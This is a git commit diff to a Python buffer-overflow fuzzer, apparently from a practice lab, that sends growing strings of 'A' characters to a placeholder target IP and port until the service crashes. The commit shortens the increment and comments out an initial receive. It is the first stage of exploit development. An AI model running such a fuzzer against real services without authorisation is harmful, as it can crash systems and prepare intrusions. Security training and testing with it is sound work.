0059389ff8fa3bd784efc48d19026668064bc132
Josiah Kohlmeyer <jrkohlmeyer19@gmail.com>
2022-03-01 17:22:34 -0600

    Update bof-fuzzer.py

--- bof-fuzzer.py
+++ bof-fuzzer.py
@@ -6,21 +6,21 @@ ip = "<TARGET_IP>"
 
 port = 1337 # TARGET_PORT
 timeout = 5
-prefix = "OVERFLOW1 "
+prefix = "PWN "
 
-string = prefix + "A" * 100
+string = prefix + "A" * 10 # Can change 10 to 100, 1000, etc
 
 while True:
   try:
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
       s.settimeout(timeout)
       s.connect((ip, port))
-      s.recv(1024)
+      #s.recv(1024) # This line is only needed if the application returns an initial message after connecting
       print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
       s.send(bytes(string, "latin-1"))
       s.recv(1024)
   except:
     print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
     sys.exit(0)
-  string += 100 * "A"
+  string += 10 * "A" # Can change increment to 100, 1000, etc
   time.sleep(1)
